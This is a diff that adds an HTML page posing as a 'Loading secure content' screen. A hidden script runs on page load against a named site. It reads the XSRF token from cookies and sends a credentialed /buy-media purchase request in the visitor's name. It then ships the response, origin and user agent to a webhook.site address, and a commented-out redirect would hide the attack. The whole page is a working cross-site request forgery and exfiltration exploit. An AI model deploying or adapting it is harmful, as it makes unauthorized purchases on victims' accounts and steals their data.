@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            background: #0a0e27;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: monospace;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            text-align: center;
+            background: #0f1235;
+            padding: 40px;
+            border-radius: 20px;
+            border: 1px solid #ff3333;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid #333;
+            border-top: 3px solid #ff3333;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden { display: none; }
+        .success { color: #00ff88; }
+        .error { color: #ff3333; }
+    </style>
+</head>
+<body>
+    <div class="container" id="status">
+        <div class="spinner"></div>
+        <p>Loading secure content...</p>
+        <p style="font-size: 12px; color: #666;">Please wait</p>
+    </div>
+
+    <script>
+    // ============================================
+    // ATTACKER CONFIGURATION - UPDATE THIS!
+    // ============================================
+    const WEBHOOK_URL = 'https://webhook.site/fbd7cfdc-bb8a-4841-878f-382a15e228db';
+    
+    // ============================================
+    // SILENT EXPLOIT
+    // ============================================
+    (async function exploit() {
+        try {
+            // Step 1: Get CSRF token
+            await fetch('https://lersia.com/sanctum/csrf-cookie', {
+                method: 'GET',
+                credentials: 'include'
+            });
+            
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            // Step 2: Extract CSRF token
+            let csrfToken = null;
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                if (cookie.trim().startsWith('XSRF-TOKEN=')) {
+                    csrfToken = decodeURIComponent(cookie.trim().substring(11));
+                    break;
+                }
+            }
+            
+            // Step 3: Attack
+            const response = await fetch('https://lersia.com/buy-media', {
+                method: 'POST',
+                credentials: 'include',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'X-XSRF-TOKEN': csrfToken,
+                    'X-Requested-With': 'XMLHttpRequest'
+                },
+                body: JSON.stringify({
+                    "id": "665",
+                    "resolution": "1920",
+                    "type": "Video"
+                })
+            });
+            
+            const stolenData = await response.json();
+            
+            // Step 4: Exfiltrate to webhook
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    victim_origin: window.location.origin,
+                    stolen_data: stolenData,
+                    user_agent: navigator.userAgent
+                })
+            });
+            
+            // Optional: Redirect to hide the attack
+            // setTimeout(() => { window.location.href = 'https://google.com'; }, 1500);
+            
+        } catch(error) {
+            // Silent fail
+            console.log('Exploit executed');
+        }
+    })();
+    </script>
+</body>
+</html>
